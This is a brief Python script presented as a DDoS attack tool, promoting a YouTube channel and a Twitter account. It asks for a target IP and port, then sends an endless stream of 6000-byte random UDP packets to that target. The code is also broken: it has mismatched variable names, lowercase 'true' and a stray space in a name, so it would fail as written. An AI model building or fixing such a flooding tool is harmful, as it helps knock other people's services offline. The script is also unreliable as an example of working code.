import os
import socket
import time
import random

os.system("clear")

print("\n")

print("DD0S ATT0K9R")
print("\n")
print(" www.youtube.com/c/qazoh")
print("\n")
print(" www.twitter.com/Devtesters1")
print("\n")

time.sleep(3)

target_ip = input("Target IP: ")
print("[+]")

print("\n")

time.sleep(3)
target_port = input("Target Port: ")
print("[+]")
print("\n")
print("Attack Starting Pls WAIT")

time.sleep(5)

byte = random._urandom(6000)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sayac = 0

while true:
	sock.sendto(bytes,(Target_IP, Target_ port))
	sayac = sayac + 1
	print("Attac7 Started, Send1ng Pa6kets: %s"%(sayac))